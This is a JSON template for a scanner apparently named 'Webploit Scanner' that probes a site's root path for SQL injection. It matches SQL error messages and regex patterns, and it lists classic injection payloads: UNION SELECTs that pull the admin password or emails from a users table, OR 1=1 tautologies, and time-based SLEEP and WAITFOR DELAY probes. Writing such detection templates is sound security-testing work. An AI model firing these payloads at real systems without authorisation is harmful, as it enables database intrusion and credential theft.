{
    "id": "sqli",
    "request": {
        "path":"/",
        "method": "GET",
        "redirects": "",
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "User-Agent": "Webploit Scanner"
        }
    },
    "stopAtMatch": true,
    "matchers-condition": "and",
    "matches": [
        {
            "type": "regex",
            "part": "body",
            "regex": "\\bUNION\\b.+\\bSELECT\\b.+\\bFROM\\b"
        },
        {
            "type": "regex",
            "part": "body",
            "regex": "\\bOR\\b.+\\b1=1\\b"
        },
        {
            "type": "exact",
            "part": "body",
            "string": "Syntax error"
        },
        {
            "type": "exact",
            "part": "body",
            "string": "Unknown column"
        },
        {
            "type": "exact",
            "part": "body",
            "string": "You have an error in your SQL syntax"
        }
    ],
    "payloads": [
        "1 UNION SELECT * FROM users WHERE id = 1--",
        "'+OR+1=1--",
        "1 UNION SELECT password FROM users WHERE username = 'admin'--",
        "1 UNION SELECT email FROM users WHERE id = 1--",
        "1 OR 1=1--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1 OFFSET 0--"
    ]
}
